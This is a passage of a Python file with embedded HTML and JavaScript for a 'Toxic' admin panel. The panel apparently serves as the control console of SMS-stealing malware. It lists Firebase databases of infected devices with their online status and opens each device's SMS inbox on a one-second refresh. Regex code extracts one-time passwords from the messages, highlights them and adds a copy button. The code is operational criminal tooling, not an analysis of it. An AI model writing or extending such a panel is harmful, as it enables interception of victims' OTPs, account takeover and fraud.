.confirm-box{background:#111827;border:1px solid rgba(255,56,96,.4);border-radius:14px;padding:24px;max-width:400px;width:100%;text-align:center;box-shadow:0 0 40px rgba(255,56,96,.3)}
.confirm-box h3{font-size:16px;color:#ff3860;margin-bottom:8px;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace;font-weight:900}
.confirm-box p{font-size:11px;color:#7a85a8;margin-bottom:20px;letter-spacing:1px;font-family:'Courier New',monospace}
.confirm-box .btns{display:flex;gap:10px}
.confirm-box button{flex:1;padding:14px;font-size:11px;min-height:46px}
.loading-text{text-align:center;padding:24px;color:#4a5270;font-size:12px;background:#111827;border:1px solid #1f2937;border-radius:8px;margin-bottom:14px;letter-spacing:1px;font-family:'Courier New',monospace}
.spinner{display:inline-block;width:14px;height:14px;border:2px solid #1f2937;border-top-color:#ff3860;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#00ff41;color:#0a0e1a;padding:14px 24px;border-radius:8px;font-weight:900;font-size:13px;z-index:9999;transition:transform .3s;pointer-events:none;letter-spacing:1px;font-family:'Courier New',monospace;box-shadow:0 0 30px rgba(0,255,65,.5)}
.toast.show{transform:translateX(-50%) translateY(0)}</style></head><body>

<div class="topbar">
<div class="brand"><span class="toxic">☣ TOXIC</span> FIREBASES<span class="root-badge">👑 ROOT</span></div>
<div class="conn" id="conn-badge"><span class="dot"></span><span id="conn-text">...</span></div>
<div class="nav">
  <a href="/supermasteradmin/dashboard" class="nav-link">◉ NUMBERS</a>
  <a href="/supermasteradmin/firebases" class="nav-link active">🔥 FIREBASES</a>
  <a href="/supermasteradmin/smslogs" class="nav-link">📜 SMS LOGS</a>
  <a href="/supermasteradmin/security" class="nav-link">🔒 SECURITY</a>
</div>
</div>

<div class="container">
<div class="card">
<h3>➕ ADD FIREBASE URL</h3>
<div class="add-row">
<input id="fb-url" placeholder="https://xxx.firebaseio.com" onkeypress="if(event.key==='Enter')addFirebase()" type="url" autocomplete="off">
<button class="primary" onclick="addFirebase()">ADD</button>
<button class="gray" onclick="toggleBulk()">BULK</button>
</div>
<div id="bulk-area" class="bulk-area">
<textarea id="fb-bulk" placeholder="Ek line me ek URL paste karo"></textarea>
<button class="green" onclick="bulkAdd()">📥 IMPORT ALL</button>
</div>
<div id="fb-msg" class="msg"></div>
</div>

<div class="card">
<div class="fb-header">
<h2>🔥 ALL FIREBASES <span style="background:rgba(255,56,96,.1);color:#ff3860;padding:3px 10px;border-radius:4px;font-size:10px;border:1px solid rgba(255,56,96,.3)" id="fb-count">0</span></h2>
<div class="actions">
<button class="danger" onclick="removeSelected()">🗑 SEL</button>
<button class="danger-solid" onclick="removeAll()">🗑 ALL</button>
</div>
</div>
<div class="select-all" onclick="toggleSelectAll()"><div class="checkbox" id="select-all-cb"></div><span>SELECT ALL</span></div>
<div id="loading-text" class="loading-text"><span class="spinner"></span>LOADING...</div>
<div id="fb-list" class="fb-list"></div>
</div>
</div>

<div class="confirm-overlay" id="confirm-overlay">
<div class="confirm-box">
<h3 id="confirm-title">ARE YOU SURE?</h3>
<p id="confirm-desc">THIS ACTION CANNOT BE UNDONE.</p>
<div class="btns"><button class="gray" onclick="closeConfirm()">CANCEL</button><button class="danger-solid" id="confirm-btn">DELETE</button></div>
</div>
</div>

<div id="toast" class="toast"></div>

<script>
let firebases = [];
let selected = new Set();

function toast(text){ const t = document.getElementById('toast'); t.textContent = text; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 2200); }
async function checkConn(){
  try{
    const r = await fetch('/api/conn'); const d = await r.json();
    const badge = document.getElementById('conn-badge'); const txt = document.getElementById('conn-text');
    if(d.mongo_connected){ badge.className = 'conn online'; txt.textContent = 'LIVE'; }
    else { badge.className = 'conn offline'; txt.textContent = 'OFF'; }
  }catch(e){}
}
function toggleBulk(){ const a = document.getElementById('bulk-area'); a.style.display = (a.style.display === 'block') ? 'none' : 'block'; }
async function addFirebase(){
  const url = document.getElementById('fb-url').value.trim();
  if(!url) return showMsg('fb-msg','URL REQUIRED','err');
  const r = await fetch('/api/firebases',{method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({url})});
  const d = await r.json();
  if(d.success){ showMsg('fb-msg','✅ ADDED (URL HIDDEN)','ok'); document.getElementById('fb-url').value = ''; loadFirebases(); }
  else showMsg('fb-msg','❌ '+(d.error||'ERROR'),'err');
}
async function bulkAdd(){
  const txt = document.getElementById('fb-bulk').value.trim();
  if(!txt) return showMsg('fb-msg','EMPTY','err');
  const urls = txt.split('\n').map(l=>l.trim()).filter(l=>l.startsWith('http'));
  if(!urls.length) return showMsg('fb-msg','NO VALID URLS','err');
  showMsg('fb-msg',`⏳ ADDING ${urls.length}...`,'ok');
  const r = await fetch('/api/firebases/bulk',{method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({urls})});
  const d = await r.json();
  if(d.success){ showMsg('fb-msg',`✅ ADDED: ${d.added}, SKIP: ${d.skipped}`,'ok'); document.getElementById('fb-bulk').value = ''; loadFirebases(); }
  else showMsg('fb-msg','❌ '+(d.error||'ERROR'),'err');
}
function showMsg(id, text, type){ const el = document.getElementById(id); el.className = 'msg ' + type; el.textContent = text; if(type === 'ok') setTimeout(()=>{ el.className = 'msg'; }, 3000); }

async function loadFirebases(){
  document.getElementById('loading-text').style.display = 'block';
  try{
    const r = await fetch('/api/firebases'); const d = await r.json();
    if(!d.success){ document.getElementById('loading-text').textContent = '❌ '+(d.error||'ERROR'); return; }
    firebases = d.firebases || [];
    document.getElementById('fb-count').textContent = firebases.length;
    document.getElementById('loading-text').style.display = 'none';
    renderFirebases(); updateSelectAll();
  }catch(e){ document.getElementById('loading-text').textContent = '❌ NETWORK ERROR'; }
}

function renderFirebases(){
  const box = document.getElementById('fb-list');
  if(firebases.length === 0){ box.innerHTML = '<div class="empty">📭 NO FIREBASE ADDED YET</div>'; return; }
  box.innerHTML = firebases.map(f => {
    const isSel = selected.has(f.id);
    const badge = f.source === 'personal_otp' ? '<span style="background:rgba(168,85,247,.15);color:#a855f7;font-size:9px;padding:2px 6px;border-radius:4px;font-weight:700;border:1px solid rgba(168,85,247,.3);letter-spacing:1px">👤 USER</span>' : '<span style="background:rgba(255,56,96,.15);color:#ff3860;font-size:9px;padding:2px 6px;border-radius:4px;font-weight:700;border:1px solid rgba(255,56,96,.3);letter-spacing:1px">👑 ROOT</span>';
    const stats = f.stats || {online: 0, offline: 0, devices: 0};
    return `
      <div class="fb-card">
        <div class="checkbox ${isSel ? 'checked' : ''}" onclick="event.stopPropagation();toggleSelect('${f.id}')">${isSel ? '✓' : ''}</div>
        <div class="fb-icon">🔥</div>
        <div class="fb-info" onclick="openFirebase('${f.id}')">
          <div class="fb-name">${escapeHtml(f.name || 'unnamed')}${badge}</div>
          <div class="fb-hash">🔒 ID: ${escapeHtml(f.hash || 'hidden')}</div>
          <div class="fb-counts">
            <span class="fb-count-pill online"><span class="dot"></span>${stats.online} ON</span>
            <span class="fb-count-pill offline"><span class="dot"></span>${stats.offline} OFF</span>
            <span class="fb-count-pill devices">📱 ${stats.devices} DEV</span>
          </div>
        </div>
        <div class="fb-actions">
          <button class="primary" onclick="event.stopPropagation();openFirebase('${f.id}')">OPEN</button>
          <button class="danger" onclick="event.stopPropagation();removeOne('${f.id}')">🗑</button>
        </div>
      </div>`;
  }).join('');
}

function openFirebase(id){ window.location.href = '/supermasteradmin/firebase/' + id; }
function toggleSelect(id){ if(selected.has(id)) selected.delete(id); else selected.add(id); renderFirebases(); updateSelectAll(); }
function toggleSelectAll(){ if(selected.size === firebases.length) selected.clear(); else selected = new Set(firebases.map(f => f.id)); renderFirebases(); updateSelectAll(); }
function updateSelectAll(){ const cb = document.getElementById('select-all-cb'); if(firebases.length > 0 && selected.size === firebases.length){ cb.classList.add('checked'); cb.textContent = '✓'; } else { cb.classList.remove('checked'); cb.textContent = ''; } }
function closeConfirm(){ document.getElementById('confirm-overlay').classList.remove('show'); }
function showConfirm(title, desc, onConfirm){
  document.getElementById('confirm-title').textContent = title;
  document.getElementById('confirm-desc').textContent = desc;
  document.getElementById('confirm-overlay').classList.add('show');
  const btn = document.getElementById('confirm-btn');
  const newBtn = btn.cloneNode(true);
  btn.parentNode.replaceChild(newBtn, btn);
  newBtn.addEventListener('click', async ()=>{ closeConfirm(); await onConfirm(); });
}
async function removeOne(id){
  showConfirm('DELETE THIS FIREBASE?', 'THIS ACTION CANNOT BE UNDONE', async ()=>{
    const r = await fetch('/api/firebases/'+id, {method:'DELETE'}); const d = await r.json();
    if(d.success){ toast('✅ DELETED'); selected.delete(id); loadFirebases(); }
    else toast('❌ '+(d.error||'ERROR'));
  });
}
async function removeSelected(){
  if(selected.size === 0) return toast('❌ SELECT AT LEAST ONE');
  const ids = Array.from(selected);
  showConfirm(`DELETE ${ids.length} FIREBASE(S)?`, 'CANNOT BE UNDONE', async ()=>{
    const r = await fetch('/api/firebases/bulk-delete', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ids})}); const d = await r.json();
    if(d.success){ toast(`✅ DELETED: ${d.deleted}`); selected.clear(); loadFirebases(); }
    else toast('❌ '+(d.error||'ERROR'));
  });
}
async function removeAll(){
  if(firebases.length === 0) return toast('❌ NO FIREBASES');
  showConfirm(`DELETE ALL ${firebases.length}?`, 'CANNOT BE UNDONE!', async ()=>{
    const r = await fetch('/api/firebases/all', {method:'DELETE'}); const d = await r.json();
    if(d.success){ toast(`✅ DELETED ALL: ${d.deleted}`); selected.clear(); loadFirebases(); }
    else toast('❌ '+(d.error||'ERROR'));
  });
}
function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }

checkConn();
loadFirebases();
setInterval(checkConn, 8000);
setInterval(loadFirebases, 15000);
</script>
</body>
</html>
"""


# ==================== FIREBASE VIEW HTML ====================
FIREBASE_VIEW_HTML = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — Firebase</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="theme-color" content="#ff3860">
<style>""" + HACKER_BASE_CSS + r"""
body{background:#0a0e1a;color:#e0e6ff;padding:0 0 40px;background-image:radial-gradient(ellipse at top,#1a0a0e 0%,#0a0e1a 60%)}
.topbar{background:#0a0e1a;border-bottom:1px solid #1f2937;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top))}
.brand{font-size:15px;font-weight:900;letter-spacing:2px}
.brand .toxic{background:linear-gradient(90deg,#ff3860,#ff9500);-webkit-background-clip:text;background-clip:text;color:transparent}
.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between;margin-top:8px}
@media(min-width:640px){.nav{order:0;width:auto;margin-top:0}}
.nav-link{padding:10px 14px;border-radius:8px;text-decoration:none;font-size:11px;font-weight:700;color:#7a85a8;background:#111827;border:1px solid #1f2937;white-space:nowrap;min-height:42px;display:inline-flex;align-items:center;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
.nav-link.active{background:linear-gradient(135deg,#ff3860,#ff9500);color:#0a0e1a;border-color:transparent}
.container{max-width:900px;margin:0 auto;padding:14px}
.hero{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:16px;margin-bottom:14px;position:relative;overflow:hidden}
.hero::before{content:"";position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,#ff3860,#ff9500);opacity:.6}
.hero h1{font-size:14px;font-weight:900;color:#ff3860;margin-bottom:6px;display:flex;align-items:center;gap:8px;flex-wrap:wrap;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace}
.hero .hash{font-size:10px;color:#4a5270;font-family:'Courier New',monospace;margin-bottom:14px;letter-spacing:1px}
.hero-stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(100px,1fr));gap:8px}
.hs{background:#0a0e1a;border:1px solid #1f2937;border-radius:8px;padding:12px;text-align:center}
.hs b{display:block;font-size:20px;font-weight:900;color:#ff3860;margin-bottom:2px;text-shadow:0 0 10px currentColor}
.hs span{font-size:9px;color:#4a5270;text-transform:uppercase;font-weight:700;letter-spacing:1.5px;font-family:'Courier New',monospace}
.hs.online b{color:#00ff41}
.hs.offline b{color:#ff3860}
.hs.otp b{color:#a855f7}
.list-header{display:flex;justify-content:space-between;align-items:center;margin:20px 0 12px;padding:0 4px}
.list-header h2{font-size:12px;font-weight:900;color:#ff3860;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace}
.list-header .count{font-size:11px;color:#00e5ff;background:rgba(0,229,255,.1);border:1px solid rgba(0,229,255,.3);padding:3px 10px;border-radius:4px;font-weight:700;font-family:'Courier New',monospace}
.search-box{margin-bottom:12px}
.search-box input{width:100%;padding:14px 16px;border-radius:8px;border:1.5px solid #1f2937;background:#111827;outline:none;color:#e0e6ff;letter-spacing:1px;font-family:'Courier New',monospace}
.search-box input:focus{border-color:#ff3860;box-shadow:0 0 0 3px rgba(255,56,96,.15)}
.search-box input::placeholder{color:#4a5270}
.num-card{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:14px;margin-bottom:10px;display:flex;align-items:center;gap:12px;cursor:pointer;min-height:70px;position:relative;overflow:hidden;transition:.15s}
.num-card::before{content:"";position:absolute;left:0;top:0;bottom:0;width:3px;background:#ff3860;opacity:0;transition:.2s}
.num-card:hover::before{opacity:1}
.num-card:hover{border-color:rgba(255,56,96,.3);background:#14090e}
.num-card:active{transform:scale(.99)}
.num-icon{width:42px;height:42px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:19px;flex-shrink:0;background:rgba(0,255,65,.1);border:1px solid rgba(0,255,65,.3);color:#00ff41}
.num-icon.red{background:rgba(255,56,96,.1);border-color:rgba(255,56,96,.3);color:#ff3860}
.num-icon.gray{background:rgba(122,133,168,.1);border-color:rgba(122,133,168,.3);color:#7a85a8}
.num-info{flex:1;min-width:0}
.num-title{font-size:13px;font-weight:700;color:#e0e6ff;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;letter-spacing:.5px;font-family:'Courier New',monospace}
.num-title.unknown{color:#7a85a8;font-style:italic}
.num-sub{font-size:10px;color:#7a85a8;margin-top:4px;display:flex;gap:4px;flex-wrap:wrap;letter-spacing:.5px;font-family:'Courier New',monospace}
.num-sub .pill{background:#0a0e1a;border:1px solid #1f2937;padding:2px 7px;border-radius:4px;color:#7a85a8;font-size:9px;font-weight:700}
.num-sub .pill.otp{background:rgba(168,85,247,.1);color:#a855f7;border-color:rgba(168,85,247,.3)}
.badge-online{display:flex;align-items:center;gap:5px;font-size:10px;color:#00ff41;font-weight:700;flex-shrink:0;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
.badge-online .dot{width:7px;height:7px;border-radius:50%;background:#00ff41;box-shadow:0 0 8px #00ff41;animation:pulse 1.5s infinite}
.badge-offline{display:flex;align-items:center;gap:5px;font-size:10px;color:#ff3860;font-weight:700;flex-shrink:0;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
.badge-offline .dot{width:7px;height:7px;border-radius:50%;background:#ff3860;box-shadow:0 0 8px #ff3860}
.card-actions{display:flex;gap:6px;flex-shrink:0}
.raw-btn{padding:8px 10px;background:linear-gradient(135deg,#ff3860,#ff9500);color:#fff;border:none;border-radius:6px;font-size:11px;font-weight:900;cursor:pointer;min-height:36px;display:inline-flex;align-items:center;gap:4px;letter-spacing:1px;box-shadow:0 0 10px rgba(255,56,96,.3)}
.inbox-header{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:16px;margin-bottom:12px}
.inbox-top{display:flex;align-items:center;gap:10px;margin-bottom:12px}
.back-btn{background:#0a0e1a;border:1px solid #1f2937;width:42px;height:42px;border-radius:8px;font-size:18px;cursor:pointer;color:#ff3860;font-weight:700;text-decoration:none;display:inline-flex;align-items:center;justify-content:center;flex-shrink:0}
.inbox-num{font-size:16px;font-weight:900;color:#ff3860;letter-spacing:1px;text-shadow:0 0 10px rgba(255,56,96,.5);font-family:'Courier New',monospace}
.inbox-status{display:flex;align-items:center;gap:6px;font-size:10px;color:#00ff41;font-weight:700;margin-top:2px;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
.inbox-status .dot{width:7px;height:7px;border-radius:50%;background:#00ff41;box-shadow:0 0 8px #00ff41;animation:pulse 1.5s infinite}
.inbox-status.offline{color:#ff3860}
.inbox-status.offline .dot{background:#ff3860;box-shadow:0 0 8px #ff3860;animation:none}
.inbox-meta{font-size:10px;color:#4a5270;display:flex;justify-content:space-between;align-items:center;letter-spacing:1px;font-family:'Courier New',monospace}
.refresh-icon{cursor:pointer;font-size:20px;color:#ff3860;padding:6px;min-width:36px;min-height:36px;display:flex;align-items:center;justify-content:center}
.refresh-icon.spinning{animation:spin 1s linear infinite}
.top-number-badge{background:linear-gradient(135deg,rgba(255,215,0,.1),rgba(255,149,0,.1));border:1px solid rgba(255,215,0,.4);border-radius:10px;padding:12px 14px;margin-bottom:12px;display:flex;align-items:center;gap:10px;font-size:12px;font-weight:700;color:#ffd700;font-family:'Courier New',monospace}
.top-number-badge .tn-icon{font-size:22px;flex-shrink:0}
.top-number-badge .tn-info{flex:1;min-width:0}
.top-number-badge .tn-num{font-size:16px;font-weight:900;color:#ffd700;letter-spacing:.5px;word-break:break-all;text-shadow:0 0 8px rgba(255,215,0,.5)}
.top-number-badge .tn-count{font-size:10px;color:#ffd700;font-weight:600;margin-top:2px;opacity:.8;letter-spacing:1px}
.top-number-badge .tn-highlight{background:rgba(255,215,0,.2);color:#ffd700;padding:2px 8px;border-radius:4px;font-weight:900;font-size:10px;border:1px solid rgba(255,215,0,.4)}
.sms-list{background:#111827;border:1px solid #1f2937;border-radius:10px;overflow:hidden}
.sms-item{padding:16px;border-bottom:1px solid #1f2937;position:relative}
.sms-item:last-child{border-bottom:none}
.sms-item.fresh{background:linear-gradient(90deg,rgba(0,255,65,.08),transparent 60%);border-left:3px solid #00ff41}
.sms-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;gap:8px;flex-wrap:wrap}
.sender{font-size:11px;font-weight:900;color:#ff3860;display:flex;align-items:center;flex-wrap:wrap;font-family:'Courier New',monospace;text-transform:uppercase}
.new-badge{background:linear-gradient(135deg,#ff3860,#ff9500);color:#fff;font-size:9px;font-weight:900;padding:2px 7px;border-radius:4px;margin-left:6px;letter-spacing:1px}
.sms-time{font-size:10px;color:#4a5270;font-family:'Courier New',monospace}
.sms-body{font-size:13px;color:#c5d0e6;line-height:1.6;word-break:break-word;white-space:pre-wrap;font-family:'Courier New',monospace}
.otp-highlight{background:linear-gradient(135deg,rgba(0,255,65,.2),rgba(0,229,255,.2));color:#00ff41;padding:2px 6px;border-radius:4px;font-weight:900;border:1px solid rgba(0,255,65,.4)}
.otp-copy-btn{display:inline-flex;align-items:center;gap:6px;margin-top:10px;padding:10px 16px;background:linear-gradient(135deg,#00ff41,#00e5ff);color:#0a0e1a;border:none;border-radius:6px;font-weight:900;font-size:11px;min-height:40px;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
.empty{text-align:center;padding:50px 20px;color:#4a5270;font-size:12px;background:#111827;border:1px solid #1f2937;border-radius:10px;letter-spacing:1px;font-family:'Courier New',monospace}
.loading-text{text-align:center;padding:24px;color:#4a5270;font-size:12px;background:#111827;border:1px solid #1f2937;border-radius:8px;margin-bottom:14px;letter-spacing:1px;font-family:'Courier New',monospace}
.spinner{display:inline-block;width:14px;height:14px;border:2px solid #1f2937;border-top-color:#ff3860;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#00ff41;color:#0a0e1a;padding:14px 24px;border-radius:8px;font-weight:900;font-size:13px;z-index:9999;transition:transform .3s;pointer-events:none;letter-spacing:1px;font-family:'Courier New',monospace}
.toast.show{transform:translateX(-50%) translateY(0)}
.hidden{display:none !important}</style></head><body>

<div class="topbar">
<div class="brand"><span class="toxic">☣ TOXIC</span> — FIREBASE</div>
<div class="nav"><a href="/supermasteradmin/dashboard" class="nav-link">◉ NUMBERS</a><a href="/supermasteradmin/firebases" class="nav-link active">🔥 FIREBASES</a><a href="/supermasteradmin/smslogs" class="nav-link">📜 LOGS</a></div>
</div>

<div class="container">
<div class="hero">
<h1>🔥 <span id="fb-name">LOADING...</span></h1>
<div class="hash">🔒 ID: <span id="fb-hash">hidden</span></div>
<div class="hero-stats">
<div class="hs"><b id="h-dev">0</b><span>DEVICES</span></div>
<div class="hs online"><b id="h-on">0</b><span>ONLINE</span></div>
<div class="hs offline"><b id="h-off">0</b><span>OFFLINE</span></div>
<div class="hs otp"><b id="h-otp">0</b><span>OTPS</span></div>
</div>
</div>

<div id="list-view">
<div class="loading-text" id="loading-text"><span class="spinner"></span>LOADING...</div>
<div id="list-content" class="hidden">
<div class="search-box"><input id="search-num" placeholder="▸ SEARCH" oninput="renderNumbers()"></div>
<div class="list-header"><h2>◉ NUMBERS</h2><span class="count" id="num-count">0</span></div>
<div id="num-list"></div>
</div>
</div>

<div id="inbox-view" class="hidden">
<div class="inbox-header">
<div class="inbox-top"><a href="#" class="back-btn" onclick="event.preventDefault();backToList()">←</a><div style="flex:1"><div class="inbox-num" id="inbox-num">+91 ------</div><div class="inbox-status" id="inbox-status"><span class="dot"></span><span id="inbox-status-text">ONLINE</span></div></div></div>
<div class="inbox-meta"><span>⚡ AUTO 1S · LATEST 60 SMS</span><span class="refresh-icon" onclick="loadInbox(true)">⟳</span></div>
</div>
<div id="top-number-badge" class="top-number-badge hidden">
<div class="tn-icon">🏆</div>
<div class="tn-info">
<div class="tn-num" id="tn-num">-</div>
<div class="tn-count">MOST FREQUENT SMS NUMBER <span class="tn-highlight" id="tn-count-badge">0x</span></div>
</div>
</div>
<div id="sms-container"></div>
</div>
</div>

<div id="toast" class="toast"></div>

<script>
const FB_ID = "{{FB_ID}}";
let numbers = [];
let currentNum = null;
let refreshTimer = null;
let lastInboxSig = '';

function toast(text){ const t = document.getElementById('toast'); t.textContent = text; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 1800); }

async function loadFirebase(){
  try{
    const r = await fetch('/api/firebase/' + FB_ID); const d = await r.json();
    if(!d.success){ document.getElementById('loading-text').innerHTML = '❌ '+(d.error||'ERROR'); return; }
    document.getElementById('fb-name').textContent = d.name || 'unnamed';
    document.getElementById('fb-hash').textContent = d.hash || 'hidden';
    document.getElementById('h-dev').textContent = d.device_count;
    document.getElementById('h-on').textContent = d.online_count;
    document.getElementById('h-off').textContent = d.offline_count || 0;
    document.getElementById('h-otp').textContent = d.otp_count;
    numbers = d.numbers || [];
    document.getElementById('num-count').textContent = numbers.length;
    document.getElementById('loading-text').classList.add('hidden');
    document.getElementById('list-content').classList.remove('hidden');
    renderNumbers();
  }catch(e){ document.getElementById('loading-text').innerHTML = '❌ NETWORK ERROR'; }
}

function renderNumbers(){
  const q = (document.getElementById('search-num').value || '').toLowerCase();
  const box = document.getElementById('num-list');
  const filtered = numbers.filter(n => !q || (n.number||'').toLowerCase().includes(q) || (n.device_name||'').toLowerCase().includes(q));
  if(filtered.length === 0){ box.innerHTML = '<div class="empty">📭 NO NUMBERS</div>'; return; }
  box.innerHTML = filtered.map(n => {
    const isOnline = n.online === true;
    const isUnknown = (n.number || '').startsWith('UNKNOWN-');
    const iconCls = isUnknown ? 'gray' : (isOnline ? '' : 'red');
    const badgeCls = isOnline ? 'badge-online' : 'badge-offline';
    const badgeTxt = isOnline ? 'ONLINE' : 'OFFLINE';
    const titleCls = isUnknown ? 'unknown' : '';
    return `
      <div class="num-card">
        <div class="num-icon ${iconCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})">${isUnknown ? '?' : '◉'}</div>
        <div class="num-info" onclick="openInboxGlobal(${numbers.indexOf(n)})">
          <div class="num-title ${titleCls}">${escapeHtml(n.number)}</div>
          <div class="num-sub"><span class="pill">✉ ${n.msg_count} SMS</span>${n.otp_count > 0 ? `<span class="pill otp">🔑 ${n.otp_count} OTP</span>` : ''}</div>
        </div>
        <div class="card-actions">
          <button class="raw-btn" onclick="event.stopPropagation();openRawData(${numbers.indexOf(n)})" title="Raw Data">🔍</button>
        </div>
        <div class="${badgeCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})"><span class="dot"></span>${badgeTxt}</div>
      </div>`;
  }).join('');
}

function openRawData(idx){
  if(idx < 0 || idx >= numbers.length) return;
  const n = numbers[idx];
  const url = '/supermasteradmin/debug?fb=' + encodeURIComponent(n.firebase) + '&id=' + encodeURIComponent(n.device_id);
  window.open(url, '_blank');
}

function openInboxGlobal(idx){ if(idx < 0 || idx >= numbers.length) return; openInbox(numbers[idx]); }

async function openInbox(n){
  currentNum = n; lastInboxSig = '';
  document.getElementById('list-view').classList.add('hidden');
  document.getElementById('inbox-view').classList.remove('hidden');
  document.getElementById('inbox-num').textContent = n.number;
  const statusEl = document.getElementById('inbox-status'); const statusTxt = document.getElementById('inbox-status-text');
  if(n.online === true){ statusEl.className = 'inbox-status'; statusTxt.textContent = 'ONLINE'; }
  else { statusEl.className = 'inbox-status offline'; statusTxt.textContent = 'OFFLINE'; }
  document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> LOADING...</div>';
  await loadInbox(false);
  if(refreshTimer) clearInterval(refreshTimer);
  refreshTimer = setInterval(()=>loadInbox(false), 1000);
}

function findTopNumber(msgs){
  const counter = {}; const senderNums = new Set();
  msgs.forEach(m => { const found = (m.from || '').match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || []; found.forEach(n => senderNums.add(n)); });
  msgs.forEach(m => {
    const found = (m.message || '').match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
    found.forEach(n => { if(senderNums.has(n)) return; if(n.startsWith('1800') || n.startsWith('1900') || n.startsWith('1991')) return; counter[n] = (counter[n] || 0) + 1; });
  });
  let topNum = null, topCount = 0;
  for(const [num, cnt] of Object.entries(counter)){ if(cnt > topCount){ topNum = num; topCount = cnt; } }
  return topNum ? {number: topNum, count: topCount} : null;
}

function updateTopNumberBadge(msgs){
  const badge = document.getElementById('top-number-badge');
  const top = findTopNumber(msgs);
  if(top && top.count >= 2){ document.getElementById('tn-num').textContent = '📞 ' + top.number; document.getElementById('tn-count-badge').textContent = top.count + 'x'; badge.classList.remove('hidden'); }
  else { badge.classList.add('hidden'); }
}

async function loadInbox(showLoader){
  if(!currentNum) return;
  if(showLoader){ document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> REFRESHING...</div>'; }
  const controller = new AbortController(); const timeoutId = setTimeout(() => controller.abort(), 15000);
  try{
    const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase) + '&id=' + encodeURIComponent(currentNum.device_id) + '&num=' + encodeURIComponent(currentNum.number), { signal: controller.signal });
    clearTimeout(timeoutId); const d = await r.json();
    if(!d.success){ document.getElementById('sms-container').innerHTML = '<div class="empty">❌ '+(d.error||'ERROR')+'</div>'; return; }
    const msgs = d.messages || [];
    const sig = msgs.map(m => (m.timestamp||0) + '|' + (m.message||'').slice(0,40)).join('#');
    if(sig !== lastInboxSig){ lastInboxSig = sig; renderMessages(msgs); }
  }catch(e){ clearTimeout(timeoutId); }
}

function renderMessages(msgs){
  const box = document.getElementById('sms-container');
  const now = Math.floor(Date.now() / 1000);
  let list = [...msgs].sort((a, b) => (b.timestamp||0) - (a.timestamp||0)).slice(0, 60);
  updateTopNumberBadge(list);
  if(!list.length){ box.innerHTML = '<div class="empty">📭 NO SMS</div>'; return; }
  box.innerHTML = '<div class="sms-list">' + list.map(m => {
    const otp = m.otp || extractOtp(m.message);
    const body = otp ? escapeHtml(m.message).replace(otp, `<span class="otp-highlight">${otp}</span>`) : escapeHtml(m.message);
    const copyBtn = otp ? `<button class="otp-copy-btn" onclick="copyOtp('${otp}')">📋 COPY OTP ${otp}</button>` : '';
    const ts = m.timestamp || 0; const isFresh = ts >= (now - 120);
    const timeStr = m.date_string ? m.date_string : fmtTime(ts);
    const newBadge = isFresh ? '<span class="new-badge">NEW</span>' : '';
    return `<div class="sms-item ${isFresh?'fresh':''}"><div class="sms-head"><div class="sender">${escapeHtml(m.from || 'UNKNOWN')} ${newBadge}</div><div class="sms-time">${escapeHtml(timeStr)}</div></div><div class="sms-body">${body}</div>${copyBtn}</div>`;
  }).join('') + '</div>';
}

function backToList(){
  document.getElementById('inbox-view').classList.add('hidden');
  document.getElementById('list-view').classList.remove('hidden');
  if(refreshTimer){ clearInterval(refreshTimer); refreshTimer = null; }
  currentNum = null;
}

function extractOtp(text){
  if(!text) return '';
  const t = String(text);
  let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})/i); if(m) return m[1];
  m = t.match(/(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)/i); if(m) return m[1];
  m = t.match(/#(\d{4,8})/); if(m) return m[1];
  return '';
}

function fmtTime(ts){
  if(!ts) return '';
  try{
    let t = parseInt(ts); if(t > 1e12) t = Math.floor(t/1000); if(t < 1e9) return String(ts);
    const d = new Date(t * 1000);
    return d.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true, day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' }).replace(',', ' |');
  }catch(e){ return String(ts); }
}

